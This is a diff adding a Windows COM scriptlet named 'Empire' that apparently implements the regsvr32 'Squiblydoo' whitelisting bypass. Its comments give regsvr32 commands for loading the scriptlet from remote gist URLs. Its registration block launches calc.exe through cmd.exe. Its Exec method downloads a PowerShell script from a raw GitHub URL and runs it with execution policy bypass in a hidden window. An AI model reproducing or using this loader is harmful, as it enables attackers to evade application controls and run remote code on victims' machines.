@@ -1,0 +1,50 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Empire"
+    progid="Empire"
+    version="1.00"
+    classid="{20001111-0000-0000-0000-0000FEEDACDC}"
+	>
+	<!-- regsvr32 /s /i"C:\Bypass\STC_MsgBox.sct" scrobj.dll -->
+	<!-- regsvr32 /s /i:http://server/STC_MsgBox.sct scrobj.dll -->
+	<!-- That should work over a proxy and SSL/TLS... -->
+	<!-- regsvr32 /s https://gist.githubusercontent.com/Elm0D/3f043115622738f6b70b76f419d2b45f/raw/8940d14d05cb7ed2e15fcdc4e005d04ad39b92a5/STC_MsgBox.sct -->
+	<!-- regsvr32 /s /n /u /i:https://gist.githubusercontent.com/Elm0D/3f043115622738f6b70b76f419d2b45f/raw/8940d14d05cb7ed2e15fcdc4e005d04ad39b92a5/STC_MsgBox.sct scrobj.dll -->
+	<!-- Credits Of Concept - Casey Smith  -->
+	<script language="JScript">
+		<![CDATA[
+		
+      a=new ActiveXObject("WScript.Shell");
+      a.run('%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();
+    
+    
+		]]>
+</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+	
+	function Exec()
+	{
+
+    w = new ActiveXObject("WScript.Shell");
+		h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+		h.Open("GET","https://raw.githubusercontent.com/riyantigomez/gomez22/master/00.ps1",false);
+		h.Send();
+		c = h.ResponseText;
+		ps = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden -Command ';
+		r = new ActiveXObject("WScript.Shell").Exec(ps + c);
+   
+   
+	}
+	
+]]>
+</script>
+
+</scriptlet>
